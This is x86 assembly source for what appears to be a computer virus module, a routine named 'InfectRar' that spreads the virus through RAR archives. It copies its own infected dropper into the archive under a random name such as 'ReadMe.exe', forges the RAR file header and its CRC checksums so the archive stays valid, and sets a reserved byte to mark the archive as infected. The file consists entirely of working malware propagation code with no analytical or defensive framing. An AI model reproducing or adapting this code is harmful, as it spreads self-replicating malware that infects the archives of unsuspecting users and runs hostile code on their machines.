

;rar archive infection procedure:
;tested with rar archive's that created using winrar v3.20
InfectRar:
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + rar_warning]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	ExitRarInfection
ENDIF
	call	InitRandomNumber
	push	0ffh
	lea	eax,[ebp + InfectedDropper]
	push	eax
	push	0h
	call	[ebp + GetModuleFileName]	;use virus dropper
	cmp	eax,0h
	je	ExitRarInfection
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + InfectedDropper]
	push	eax
	call	[ebp + CreateFile]		;open the infected dropper
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitRarInfection
	mov	[ebp + hInfectedDropper],eax
	push	0h
	push	eax
	call	[ebp + GetFileSize]		;get dropper file size
	cmp	eax,0ffffffffh
	je	ExitAndCloseDropperFile
	mov	[ebp + DropperSize],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CreateFileMapping]	;create file mapping object for the dropper
	cmp	eax,0h
	je	ExitAndCloseDropperFile
	mov	[ebp + hDropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + MapViewOfFile]		;map dropper into memory
	cmp	eax,0h
	je	ExitAndCloseDropperMap
	mov	[ebp + DropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]		;open rar file
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitAndUnMapDropper
	mov	[ebp + hRarFile],eax
	xor	eax,eax
	push	eax
	mov	eax,[ebp + nFileSizeLow_]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CreateFileMapping]	;create file mapping object of the rar file
	cmp	eax,0h
	je	ExitAndCloseRarFile
	mov	[ebp + hRarMap],eax
	mov	eax,[ebp + nFileSizeLow_]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hRarMap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	ExitAndCloseRarMap
	mov	[ebp + RarMap],eax
	cmp	dword ptr [eax],"!raR"		;is rar file ?
	jne	RarFileInfectionErr
	cmp	byte ptr [eax + 0fh],1h		;is already infected ?
	je	RarFileInfectionErr
	xor	eax,eax
	mov	edx,[ebp + DropperMap]
	mov	ecx,[ebp + DropperSize]
	call	xcrc32				;get infected dropper crc32 checksum
	mov	dword ptr [ebp + FILE_CRC],eax	;set it insaid rar header
	mov	eax,dword ptr [ebp + ftCreationTime + 4]
	mov	dword ptr [ebp + FTIME],eax	;set random time\data
	pushad
	mov	ecx,6h
	lea	edi,[ebp + FileInsaidRar]
@RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@RandLetter			;gen random name for the infected dropper
	popad
	mov	eax,[ebp + DropperSize]
	mov	[ebp + PACK_SIZE],eax
	mov	[ebp + UNP_SIZE],eax		;set dropper size insaid of rar header
	xor	eax,eax
	lea	edx,[ebp + headcrc]
	mov	ecx,(EndRarHeader-RarHeader-2)
	call	xcrc32				;get crc32 checksum of the rar header
	mov	word ptr [ebp + HEAD_CRC],ax	;and set it in rar header
	lea	esi,[ebp + RarHeader]
	mov	edi,[ebp + RarMap]
	add	edi,[ebp + nFileSizeLow_]
	sub	edi,7h				;overwrite rar file sign
	push	edi
	mov	ecx,RarHeaderSize
	rep	movsb				;write the rar header into rar file
	mov	esi,[ebp + DropperMap]
	pop	edi
	add	edi,RarHeaderSize
	mov	ecx,[ebp + DropperSize]
	rep	movsb				;write the infected dropper into rar file
	mov	eax,[ebp + RarMap]
	push	eax
	inc	byte ptr [eax + 0fh]		;mark the rar file as infected(0fh=reserved1)
	mov	edx,eax
	xor	eax,eax
	add	edx,9h
	mov	ecx,0bh
	call	xcrc32				;get crc32 of the rar main header
	pop	ebx
	mov	word ptr [ebx + 7h],ax		;[ebx + 7h]=HEAD_CRC
ExitAndUnMapRarFile:
	push	[ebp + RarMap]
	call	[ebp + UnMapViewOfFile]
ExitAndCloseRarMap:
	push	dword ptr [ebp + hRarMap]
	call	[ebp + CloseHandle]
ExitAndCloseRarFile:
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CloseHandle]
ExitAndUnMapDropper:
	push	dword ptr [ebp + DropperMap]	
	call	[ebp + UnMapViewOfFile]
ExitAndCloseDropperMap:
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + CloseHandle]
ExitAndCloseDropperFile:
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CloseHandle]
ExitRarInfection:
	ret
RarFileInfectionErr:
	push	FILE_BEGIN
	push	0h
	push	dword ptr [ebp + nFileSizeLow_]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetEndOfFile]
	jmp	ExitAndUnMapRarFile
	
	
	InfectedDropper		db	0ffh	dup(0)
	hInfectedDropper	dd	0
	DropperSize		dd	0
	hDropperMap		dd	0
	DropperMap		dd	0
	hRarFile		dd	0
	hRarMap			dd	0
	RarMap			dd	0
	
	
	
RarHeader:
		HEAD_CRC	dw	0h
	headcrc:HEAD_TYPE	db	74h
		HEAD_FLAGS	dw	8000h	;normal flag
		HEAD_SIZE	dw	RarHeaderSize
		PACK_SIZE	dd	0h
		UNP_SIZE	dd	0h
		HOST_OS		db	0h	;Ms-Dos
		FILE_CRC	dd	0h
		FTIME		dd	0h
		UNP_VER		db	14h
		METHOD		db	30h	;storing
		NAME_SIZE	dw	0ah	;file name size
	endhcrc:ATTR		dd	0h
	FileInsaidRar	equ	$
		FILE_NAME	db	"ReadMe.exe"
	EndRarHeader:
RarHeaderSize	equ	($-RarHeader)	

IF	DEBUG
	rar_warning	db "Rar File Infection!",0
ENDIF
	

;(c) z0mbie/29a crc32 function
; input:  EDX=data, ECX=size, EAX=crc
; output: EAX=crc, EDX+=ECX, ECX=BL=0
xcrc32:	jecxz   @@4			
	not     eax
@@1:	xor     al, [edx]
	inc     edx
	mov     bl, 8
@@2:	shr     eax, 1
	jnc     @@3
	xor     eax, 0EDB88320h
@@3:	dec     bl
	jnz     @@2
	loop    @@1
	not     eax
@@4:	ret
